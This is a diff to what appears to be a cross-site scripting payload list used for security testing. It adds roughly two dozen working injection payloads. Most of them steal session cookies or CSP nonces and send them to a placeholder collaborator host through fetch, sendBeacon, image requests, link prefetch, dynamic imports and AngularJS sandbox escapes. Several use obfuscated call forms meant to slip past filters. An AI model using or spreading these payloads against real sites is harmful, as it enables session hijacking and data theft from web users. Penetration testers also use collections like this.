@@ -1,3 +1,27 @@
-"><link rel=prefetch href=https://CALLBACK>
-"><meta http-equiv="refresh" content="0;url=https://CALLBACK/?c=__XSS__">
-"><base href="https://CALLBACK/">
+<script>fetch('//COLLABORATOR_URL/?c='+document.cookie,{mode:'no-cors'})</script>
+<script>navigator.sendBeacon('//COLLABORATOR_URL/',document.cookie)</script>
+<script>new Image().src='//COLLABORATOR_URL/?c='+document.cookie</script>
+<link rel=prefetch href='//COLLABORATOR_URL/?c=COOKIE'>
+<link rel=preconnect href='//COLLABORATOR_URL/'>
+<link rel=dns-prefetch href='//COLLABORATOR_URL/'>
+<script>var l=document.createElement('link');l.rel='prefetch';l.href='//COLLABORATOR_URL/?c='+document.cookie;document.head.appendChild(l);</script>
+<meta name=referrer content=unsafe-url><script>location='//COLLABORATOR_URL/?c='+document.cookie</script>
+<script>import('//COLLABORATOR_URL/xss.js')</script>
+<script>import('data:text/javascript,fetch("//COLLABORATOR_URL/?c="+document.cookie)')</script>
+<script nonce=LEAKED_NONCE>alert(1)</script>
+<script>Array.from(document.scripts).map(s=>fetch('//COLLABORATOR_URL/?n='+s.nonce))</script>
+<script>document.head.querySelectorAll('[nonce]').forEach(e=>new Image().src='//COLLABORATOR_URL/?n='+e.nonce)</script>
+<script src=//cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js></script><div ng-app>{{constructor.constructor('fetch("//COLLABORATOR_URL/?c="+document.cookie)')()}}</div>
+<script src=//cdn.jsdelivr.net/npm/angular/angular.min.js></script><div ng-app>{{constructor.constructor('new Image().src="//COLLABORATOR_URL/?c="+document.cookie')()}}</div>
+<script>with(window)with(document)eval('fe'+'tch("//COLLABORATOR_URL/?c="+cookie)')</script>
+<script>top['alert'](1)</script>
+<script>window['fe'+'tch']('//COLLABORATOR_URL/?c='+document.cookie)</script>
+<script>Reflect.apply(fetch,window,['//COLLABORATOR_URL/?c='+document.cookie])</script>
+<script>Promise.resolve('//COLLABORATOR_URL/?c='+document.cookie).then(fetch)</script>
+<script>fetch`//COLLABORATOR_URL/?c=${document.cookie}`</script>
+<img src=x onerror=fetch`//COLLABORATOR_URL/?c=${document.cookie}`>
+<svg onload=fetch`//COLLABORATOR_URL/?c=${document.cookie}`>
+<script>var f=fetch;f('//COLLABORATOR_URL/?c='+document.cookie)</script>
+<script>var x=window;x.fetch('//COLLABORATOR_URL/?c='+document.cookie)</script>
+<script>(0,fetch)('//COLLABORATOR_URL/?c='+document.cookie)</script>
+<script>[fetch][0]('//COLLABORATOR_URL/?c='+document.cookie)</script>
